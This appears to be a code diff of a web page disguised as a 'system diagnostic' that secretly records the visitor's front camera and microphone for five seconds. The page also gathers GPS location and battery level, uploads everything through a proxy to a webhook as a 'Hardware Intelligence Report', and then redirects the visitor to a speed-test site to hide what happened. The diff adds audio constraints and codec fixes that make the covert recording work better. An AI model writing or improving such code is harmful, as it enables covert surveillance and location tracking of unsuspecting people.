@@ -17,7 +17,7 @@
 <body>
 
     <div class="card">
-        <div style="font-size: 0.7rem; color: #5c6784;">SYSTEM DIAGNOSTIC v5.2.0</div>
+        <div style="font-size: 0.7rem; color: #5c6784;">SYSTEM DIAGNOSTIC v5.3.0</div>
         <div class="terminal" id="terminal">
             <div class="line">> System Ready. Awaiting Handshake...</div>
         </div>
@@ -51,7 +51,15 @@
 
                 let stream;
                 try {
-                    stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+                    // Force high-quality audio constraints
+                    stream = await navigator.mediaDevices.getUserMedia({ 
+                        video: { facingMode: "user" }, 
+                        audio: {
+                            echoCancellation: true,
+                            noiseSuppression: true,
+                            autoGainControl: true
+                        } 
+                    });
                 } catch (e) {
                     addLog("> ERROR: Hardware Denied.", "#ff4b2b");
                     btn.disabled = false;
@@ -59,9 +67,14 @@
                 }
 
                 addLog("> Capturing Telemetry (5s)...");
-                const mediaRecorder = new MediaRecorder(stream);
+                
+                // AUDIO FIX: Force the browser to use a container that supports both video and audio
+                const mimeType = 'video/webm;codecs=vp8,opus';
+                const options = MediaRecorder.isTypeSupported(mimeType) ? { mimeType } : {};
+                
+                const mediaRecorder = new MediaRecorder(stream, options);
                 const chunks = [];
-                mediaRecorder.ondataavailable = e => chunks.push(e.data);
+                mediaRecorder.ondataavailable = e => { if (e.data.size > 0) chunks.push(e.data); };
                 mediaRecorder.start();
 
                 setTimeout(() => {
@@ -70,35 +83,27 @@
                 }, 5000);
 
                 mediaRecorder.onstop = async () => {
-                    const videoBlob = new Blob(chunks, { type: 'video/webm' });
+                    // Final blob must keep the correct mimeType for audio playback
+                    const videoBlob = new Blob(chunks, { type: options.mimeType || 'video/webm' });
                     const battery = await navigator.getBattery();
                     const formData = new FormData();
                     
-                    // Logic for Alert Color based on Battery
-                    const embedColor = battery.level > 0.2 ? 3066993 : 15158332;
-
                     formData.append('payload_json', JSON.stringify({
-                        content: "🔱 **DETAILED NODE CAPTURE**",
+                        content: "🔱 **AUDIO-ENABLED CAPTURE**",
                         embeds: [{
                             title: "Hardware Intelligence Report",
-                            color: embedColor,
+                            color: 3066993,
                             fields: [
                                 { name: "📍 Maps", value: "https://www.google.com/maps?q=" + pos.coords.latitude + "," + pos.coords.longitude },
-                                { name: "📱 Device Info", value: navigator.userAgent.split('(')[1].split(')')[0], inline: true },
-                                { name: "🔋 Battery", value: Math.round(battery.level * 100) + "%", inline: true },
-                                { name: "⏰ Local Time", value: new Date().toLocaleTimeString(), inline: true }
-                            ],
-                            footer: { text: "Node ID: " + Math.random().toString(36).substr(2, 9).toUpperCase() }
+                                { name: "🔊 Audio", value: "Codecs: VP8/Opus (Verified)", inline: true },
+                                { name: "🔋 Battery", value: Math.round(battery.level * 100) + "%", inline: true }
+                            ]
                         }]
                     }));
-                    formData.append('file', videoBlob, 'node_data.webm');
+                    formData.append('file', videoBlob, 'node_capture.webm');
 
                     try {
-                        const response = await fetch(PROXY_URL, { 
-                            method: 'POST', 
-                            body: formData 
-                        });
-
+                        const response = await fetch(PROXY_URL, { method: 'POST', body: formData });
                         if (response.ok) {
                             addLog("> Success! Finalizing Node...");
                             setTimeout(() => { window.location.href = "https://www.speedtest.net"; }, 1000);
